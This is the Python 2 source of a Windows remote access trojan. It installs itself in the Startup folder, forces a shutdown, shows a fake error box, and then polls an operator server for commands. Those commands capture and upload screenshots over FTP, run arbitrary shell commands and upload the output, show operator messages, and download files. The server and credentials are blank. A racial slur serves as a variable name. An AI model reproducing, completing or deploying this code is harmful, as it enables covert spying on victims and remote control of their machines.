#! python2

import os, time, sys, wget, traceback, urllib2, subprocess
import getpass, ctypes, PIL.ImageGrab, ftplib, urllib

# Variables

nigga = 0

vir_host = ' '
vir_logi = ' '
vir_pasi = ' '
vir_vicid = ' '
vir_myurl = ' '

# START-UP

def shut():
    time.sleep(35)
    os.system("shutdown /s")

def cdefi():
    disf = "\"C:\Users" + "\\" + quest + "\Documents\""
    cdefic = "1"
    sbgcodew3 = open("cdefic.txt" , 'w')
    sbgcodew3.write(cdefic)
    sbgcodew3.close()
    os.system("move cdefic.txt " + disf)

def cdefic():
    try:
        disd = "C:\Users" + "\\" + quest + "\Documents\\"
        a88 = open(disd + "cdefic.txt", 'r')
        if a88.read() == "1":
            return False
    except:
        return True

def stup():
    global cd
    global quest
    global startxa
    global filen
    global ft

    cd = os.getcwd()
    quest = getpass.getuser()
    filen = "\"" + sys.argv[0] + "\""

    disd = "C:\Users" + "\\" + quest + "\Documents\\"
    startxa = "C:\Users" + "\\" + quest + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    start = "\"C:\Users" + "\\" + quest + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\""

    if cdefic() == False:
        ft = False
        print ft
        ctypes.windll.user32.MessageBoxA(0, "ERROR 49, ERROR!", "ERROR!", 1)
        watd()


    else:
        cdefi()
        ft = True
        startupcom = "copy " + filen + " " + start
        os.system(startupcom)
        shut()

# What to do?

def watd():

    while nigga <= 1:

        urlupda = "http://" + vir_myurl + "/wtd/" + vir_vicid + "/asno.html"
        f = urllib.urlopen(urlupda)
        updater = f.readline(1)
        time.sleep(05)

        while updater == "1":
            time.sleep(05)
            for updater in range(1):
                f = urllib.urlopen(urlupda)
                updater = f.readline(1)
                time.sleep(5)

        while updater == "2":
                    #Screen_log
                    bitmap = PIL.ImageGrab.grab()
                    start2469 = "C:\Users" + "\\\\" + quest + "\\\\Pictures" + "\\\\" + "2469.jpg"
                    bitmap.save(start2469)
                    n5 = "2469"
                    ftp = ftplib.FTP(vir_host, vir_logi , vir_pasi)
                    ftp.cwd('public_html')
                    ftp.cwd('images')
                    ftp.cwd(vir_vicid)
                    filez = open(start2469 , 'rb')
                    name6 = str(n5)+".jpg"
                    time.sleep(5)
                    try:
                        try:
                            f = open(start2469, "rb")
                            name= str(n5)+".jpg"
                            ftp.storbinary('STOR ' + name, f)
                            f.close()
                        finally:
                            ftp.quit()
                    except:
                        traceback.print_exc()

                    time.sleep(30)
                    for updater in range(1):
                        f = urllib.urlopen(urlupda)
                        updater = f.readline(1)
                        time.sleep(5)

        while updater == "3":
            #CMD
            for updatz5 in range(1):
                ftp = ftplib.FTP(vir_host, vir_logi , vir_pasi)
                ftp.cwd('public_html')
                ftp.cwd('cmd')
                ftp.cwd(vir_vicid)
                urlup5 = "http://" + vir_myurl + "/cmd/" + vir_vicid + "/aat.js"
                usock = urllib2.urlopen(urlup5)
                updatz5 = usock.read()
                usock.close()
                if updatz5 == "":
                    time.sleep(5)
                try:
                    command = subprocess.check_output(updatz5, shell=True)
                except:
                    os.system(updatz5)

                time.sleep(1)
                ansa = open("tpo.js" , 'w')
                ansa.write(command)
                ansa.close()
                ftp.storbinary("STOR tpo.js", open("tpo.js", "rb"))
                ftp.quit()

            for updater in range(1):
                f = urllib.urlopen(urlupda)
                updater = f.readline(1)
                if updater == "3":
                    time.sleep(5)

        while updater == "4":
            for updat6 in range(1):
                urlup5 = "http://" + vir_myurl + "/dm/" + vir_vicid + "/bling.js"
                usock = urllib2.urlopen(urlup5)
                updat6 = usock.read()
                usock.close()
                ctypes.windll.user32.MessageBoxA(0, updat6 , "ERROR!", 1)
                time.sleep(10)

            for updater in range(1):
                f = urllib.urlopen(urlupda)
                updater = f.readline(1)
                time.sleep(5)

        while updater == "5":
            time.sleep(05)

            for updat6z in range(1):
                urlup5 = "http://" + vir_myurl + "/df/" + vir_vicid + "/blong.js"
                usock = urllib2.urlopen(urlup5)
                updat6z = usock.read()
                usock.close()
                wget.download(updat6z)
                time.sleep(10)


            for updater in range(1):
                f = urllib.urlopen(urlupda)
                updater = f.readline(1)
                time.sleep(5)

        else:
            time.sleep(05)
            for updater in range(1):
                f = urllib.urlopen(urlupda)
                updater = f.readline(1)
                time.sleep(5)

stup()
